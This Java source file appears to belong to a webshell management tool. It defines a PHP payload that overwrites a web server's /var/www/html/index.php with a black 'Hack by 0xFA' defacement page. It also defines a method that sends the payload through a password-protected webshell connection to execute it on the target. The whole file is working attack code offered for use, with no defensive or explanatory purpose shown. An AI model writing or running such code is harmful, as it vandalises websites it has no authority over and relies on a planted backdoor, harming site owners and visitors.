package com.atlant1c.utils;

import com.atlant1c.connect.PhpConnect;

public class AddBlackPage {

    private static final String code ="file_put_contents('/var/www/html/index.php', \"<!DOCTYPE html>\\n<html lang=\\\"en\\\">\\n<head>\\n    <meta charset=\\\"UTF-8\\\">\\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\">\\n    <title>Hack by 0xFA</title>\\n    <style>\\n        body {\\n            background-color: #000;\\n            color: #fff;\\n            display: flex;\\n            justify-content: center;\\n            align-items: center;\\n            height: 100vh;\\n            margin: 0;\\n            font-family: Arial, sans-serif;\\n            font-size: 2em;\\n        }\\n        .container {\\n            text-align: center;\\n        }\\n        .title {\\n            font-size: 3em;\\n            font-weight: bold;\\n        }\\n        .author {\\n            font-size: 1.5em;\\n            margin-top: 20px;\\n        }\\n    </style>\\n</head>\\n<body>\\n    <div class=\\\"container\\\">\\n        <div class=\\\"title\\\">Hack</div>\\n        <div class=\\\"author\\\">by 0xFA</div>\\n    </div>\\n</body>\\n</html>\");";
    public static void addBlackPage(String url, String pass) {
        PhpConnect.executePhp(url,pass,code);
    }


}
